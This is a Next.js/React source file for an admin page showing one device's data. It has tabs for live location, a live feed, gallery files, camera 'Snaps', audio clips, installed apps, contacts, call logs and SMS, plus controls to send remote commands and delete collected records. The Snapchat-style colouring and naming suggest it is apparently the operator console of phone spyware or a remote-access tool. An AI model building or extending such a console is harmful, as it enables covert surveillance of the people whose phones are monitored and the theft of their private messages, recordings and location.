// app/admin/devices/[id]/page.tsx
"use client";

import React, { useState, useEffect, useCallback } from "react";
import { useParams } from "next/navigation";
import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
import { DeviceTabBar } from "@/components/admin/devices/DeviceTabBar";
import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder } from "lucide-react";
import { useDeviceDetail } from "@/components/admin/devices/useDeviceDetail";

const TAB_PREFS_KEY = "snap_tab_prefs";

function loadTabPrefs(): Record<string, boolean> {
  if (typeof window === "undefined") return {};
  try { return JSON.parse(localStorage.getItem(TAB_PREFS_KEY) || "{}"); } catch { return {}; }
}

function saveTabPrefs(prefs: Record<string, boolean>) {
  try { localStorage.setItem(TAB_PREFS_KEY, JSON.stringify(prefs)); } catch {}
}

export default function DeviceDetailPage() {
  const params = useParams();
  const deviceId = params.id as string;

  const [tabPrefs, setTabPrefs] = useState<Record<string, boolean>>({});
  useEffect(() => { setTabPrefs(loadTabPrefs()); }, []);

  // Default is strictly OFF (false) per user directive (zero DB/network load)
  const isTabEnabled = useCallback((tabId: string) => tabPrefs[tabId] === true, [tabPrefs]);

  const {
    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement, locationMode, setLocationMode,
    handleFullRefresh, handleToggleLiveMovement, sendCommand, handleDeleteCommand, handleBulkDeleteCommands,
    handleDeleteContact, handleDeleteCall, handleDeleteMessage, handleDeleteApp, handleDeleteFile,
    handleBulkDeleteContacts, handleBulkDeleteCalls, handleBulkDeleteMessages, handleBulkDeleteApps, handleBulkDeleteFiles,
    fetchTabData,
  } = useDeviceDetail(deviceId, isTabEnabled);

  const toggleTab = (tabId: string) => {
    const nextVal = !isTabEnabled(tabId);
    const next = { ...tabPrefs, [tabId]: nextVal };
    setTabPrefs(next);
    saveTabPrefs(next);
    if (nextVal) fetchTabData(tabId, true, true);
  };

  if (loading && !device) {
    return (
      <div className="flex items-center justify-center min-h-[400px]">
        <div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" />
      </div>
    );
  }
  if (!device) return <div className="p-8 text-center text-white/50">Device not found</div>;

  const counts = (device as any)?.counts || {};
  const TABS = [
    { id: "map", label: "Live Map", icon: MapPin },
    { id: "stream", label: "Live Feed", icon: Radio },
    { id: "gallery", label: `Gallery (${counts.gallery ?? files.length})`, icon: Folder },
    { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
    { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
    { id: "apps", label: `Apps (${counts.apps ?? appCount})`, icon: Layers },
    { id: "contacts", label: `Contacts (${counts.contacts ?? contacts.length})`, icon: User },
    { id: "calls", label: `Calls (${counts.calls ?? calls.length})`, icon: Phone },
    { id: "messages", label: `SMS (${counts.messages ?? messages.length})`, icon: MessageSquare },
  ];

  return (
    <div className="space-y-3 sm:space-y-5 pb-20 md:pb-8 max-w-full overflow-x-hidden">
      {toast && (
        <div className="fixed top-6 right-6 z-50 py-3 px-5 rounded-2xl bg-black/90 border border-[#FFFC00]/40 text-[#FFFC00] text-xs font-bold shadow-2xl backdrop-blur-xl flex items-center gap-2">
          <span>{toast}</span>
        </div>
      )}

      <DeviceDetailHeader device={device} onRefresh={handleFullRefresh} isRefreshing={isRefreshing} />

      <DeviceTabBar tabs={TABS} activeTab={activeTab} onSelectTab={setActiveTab} />

      <DeviceTabViews
        activeTab={activeTab}
        device={device}
        locations={locations}
        contacts={contacts}
        calls={calls}
        messages={messages}
        captures={captures}
        audioClips={audioClips}
        files={files}
        filesLoading={filesLoading}
        tabLoading={tabLoading}
        isLiveMovement={isLiveMovement}
        isTabEnabled={isTabEnabled(activeTab)}
        onToggleTab={() => toggleTab(activeTab)}
        onFetchOnce={() => fetchTabData(activeTab, true, true)}
        onToggleLiveMovement={handleToggleLiveMovement}
        locationMode={locationMode}
        onToggleLocationMode={() => setLocationMode(locationMode === "realtime" ? "fetch" : "realtime")}
        onSendCommand={sendCommand}
        onDeleteCommand={handleDeleteCommand}
        onBulkDeleteCommands={handleBulkDeleteCommands}
        onDeleteContact={handleDeleteContact}
        onDeleteCall={handleDeleteCall}
        onDeleteMessage={handleDeleteMessage}
        onDeleteApp={handleDeleteApp}
        onDeleteFile={handleDeleteFile}
        onBulkDeleteContacts={handleBulkDeleteContacts}
        onBulkDeleteCalls={handleBulkDeleteCalls}
        onBulkDeleteMessages={handleBulkDeleteMessages}
        onBulkDeleteApps={handleBulkDeleteApps}
        onBulkDeleteFiles={handleBulkDeleteFiles}
      />
    </div>
  );
}